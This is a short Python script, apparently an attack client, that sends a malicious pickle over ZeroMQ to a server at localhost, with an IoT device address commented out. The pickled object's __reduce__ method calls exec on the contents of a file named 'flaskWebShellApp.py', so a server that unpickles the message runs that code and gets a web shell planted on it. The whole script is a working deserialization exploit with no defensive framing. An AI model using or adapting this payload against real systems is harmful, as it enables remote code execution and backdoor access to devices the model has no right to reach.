import zmq
import pickle

dataStr = ''
class PickleCodeBomb:
    def __reduce__(self):
        global dataStr
        return exec, (dataStr,)

#iotIP = '172.23.155.209'
iotIP = '127.0.0.1'
port = 3003

context = zmq.Context()
print("Connecting to server...")
socket = context.socket(zmq.REQ)
#socket.connect ("tcp://localhost:%s" % port)
socket.connect("tcp://%s:%s" %(iotIP,port))
print("Sending request btyes via ZMQ client:")

fileNameStr = 'flaskWebShellApp.py'
obj = None
try:
    with open(fileNameStr, 'r') as fh:
        dataStr = fh.read()
    obj = PickleCodeBomb()
except Exception as err:
    print("Error: can not read python file %s" % err)
    exit()
pickledata = pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)
socket.send(pickledata)
#  Get the reply.
replyData = socket.recv()
print("received reply bytes:")
print(str(replyData))
reqDict = pickle.loads(replyData)
print ("Received reply: \n %s" %str(reqDict))
